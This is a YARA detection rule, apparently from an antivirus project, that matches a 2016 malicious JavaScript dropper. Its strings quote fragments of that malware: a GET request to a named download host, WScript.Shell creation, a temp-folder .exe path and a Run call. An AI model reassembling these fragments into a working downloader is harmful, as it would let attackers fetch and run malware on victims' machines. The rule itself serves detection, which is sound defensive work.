rule sig_20160330_0cab69c699bd41db6e5cbc55bd614d66 {
  meta:
    description = "datamaliciousorder - file 20160330_0cab69c699bd41db6e5cbc55bd614d66.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ceea3194b986791169059edec62bf27d04902c67674fcc54fc446c7112f26f91"

  strings:
    $s1  = "QU[AO](\"GET\", \"http://abnreview.com.au/j7dsa\", false);" fullword ascii
    $s2  = "function F(T1, EY){JD = JD * 1; return T1 - EY;};" fullword ascii
    $s3  = "var X0 = function CO() {return WScript[HP](\"WScript\"+\".Shell\");}(), S = 11;" fullword ascii
    $s4  = "if (QU[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VR(){return T0 + \"\";};" fullword ascii
    $s6  = "function EA() {return X0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0nvsrKPr2CBpgnzj.ex\" + \"e\";};" fullword ascii
    $s7  = "function J(RT){X0[\"Run\"](RT, JD, JD);};" fullword ascii
    $s8  = "function HL() {return ((B0 == true) && (B0 == E)) ? 1 : JD;};" fullword ascii
    $s9  = "function XG(){return 22;};" fullword ascii
    $s10 = "function L(F0) {var R = (1, 2, 3, 4, 5, F0); return R;};" fullword ascii
    $s11 = "var AN = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (A);" fullword ascii
    $s13 = "return F(B, IT);" fullword ascii
    $s14 = "function IV()" fullword ascii
    $s15 = "function BE(){return HP;};" fullword ascii
    $s16 = "E = true; " fullword ascii
    $s17 = "var B0 = false;" fullword ascii
    $s18 = "B0 = true; " fullword ascii
    $s19 = "} catch(NT){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}